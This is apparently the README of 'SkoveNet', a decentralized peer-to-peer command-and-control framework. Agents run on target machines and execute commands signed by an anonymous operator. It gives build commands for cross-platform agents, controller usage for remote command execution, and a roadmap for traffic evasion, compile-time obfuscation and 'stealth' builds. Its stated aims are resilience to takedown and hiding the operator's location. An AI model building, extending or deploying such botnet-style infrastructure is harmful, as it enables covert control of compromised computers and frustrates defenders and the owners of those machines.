
**SkoveNet** is a decentralized Command & Control (C2) framework engineered to eliminate Single Points of Failure and ensure maximum operator anonymity.

Unlike traditional client-server C2 models, SkoveNet implements a decoupled Agent-Controller architecture. This allows the operator to interface with the network through any active node, removing the dependency on a static command center and obfuscating the operator's physical location.

![structure diagram](static/structure_diagram.png)
**No server. No domain. No single point of failure.**


## Core Features
- Fully decentralized P2P mesh network
- Max 5 neighbors per agent → tiny traffic footprint
- Automatic self-healing topology
- Operator = whoever has the cryptographic secret key
- Commands signed with Ed25519 → no spoofing
- End-to-end encrypted (Noise protocol)
- GossipSub broadcast (fast & reliable)
- Single binary, zero dependencies – works on Windows, Linux, macOS, ARM
- NAT traversal & hole punching built-in
- **`sgen`** — standalone agent generator (no Go toolchain required)

## Architecture

| Vector                         | Traditional C2 | SkoveNet                          |
| ------------------------------ | -------------- | --------------------------------- |
| Central server?                | Yes            | Never                             |
| Killable by blocking 1 IP?     | Yes            | Impossible                        |
| Operator has fixed location?   | Yes            | No – any node with the secret key |
| Network dies when nodes drop?  | Yes            | No – self-healing graph           |
| Command authenticity           | Server cert    | Ed25519-signed by secret key      |

## Components

| Binary         | Purpose                                              |
| -------------- | ---------------------------------------------------- |
| **agent**      | P2P node that joins the mesh and executes commands    |
| **controller** | Operator CLI — connects to the local agent via IPC   |
| **sgen**       | Standalone agent generator — no Go toolchain needed   |

## Usage

### Building

```bash
# Build sgen (the agent generator)
make sgen

# Build the controller
make controller
```

### Generating Agents

```bash
# Generate a Linux agent (auto-creates a new keypair)
./bin/sgen generate --os linux --arch amd64

# Generate a Windows agent with an existing key
./bin/sgen generate --os windows --arch amd64 --key "base64pubkey..."

# Generate for macOS ARM (Apple Silicon)
./bin/sgen generate --os darwin --arch arm64

# List all supported platforms
./bin/sgen list

# Generate a keypair without building an agent
./bin/sgen keygen
```

`sgen` is a self-contained binary that embeds a Go toolchain and the agent source code. It produces fully-configured agent binaries for any supported platform — no Go compiler or build tools required on the operator's machine.

### Running

```bash
# Start the agent (on target machine)
./agent

# Connect with the controller (on operator machine)
./controller

# Inside the controller:
sign <private_key>        # Authenticate as operator
peers                     # List connected nodes
use <peerID>              # Select a target node
run whoami                # Execute command on target
radar                     # Scan for all network nodes
graph on                  # Open topology web viewer
```

## Engineering Challenge: NAT Traversal
While SkoveNet's decentralized architecture eliminates the traditional Single Point of Failure (SPoF), operating within restricted corporate networks presents a significant hurdle. Standard P2P hole-punching often fails against **Symmetric NATs** and aggressive firewalls that block non-standard egress traffic.

Currently, the framework requires manual **Bootstrap/Relay nodes** (`connect` command) to maintain connectivity in these environments.

We are actively researching the integration of **STUN/TURN** protocols and **DNS-over-HTTPS (DoH)** tunneling to enhance NAT traversal and ensure resilient peer discovery without relying on static relay infrastructure.

## Roadmap
- **Traffic Evasion:** Implement pluggable transports (WebSockets, DNS, ICMP) to mask raw libp2p signatures.
- **Obfuscation:** Integrate `garble` into sgen for compile-time obfuscation of generated agents.
- **Dynamic Key Management:** Move from static Ed25519 to a rotating CA model or JWT-based session tokens.
- **Feature Toggles:** Build-tag support in sgen for conditional compilation (`--tags stealth`).
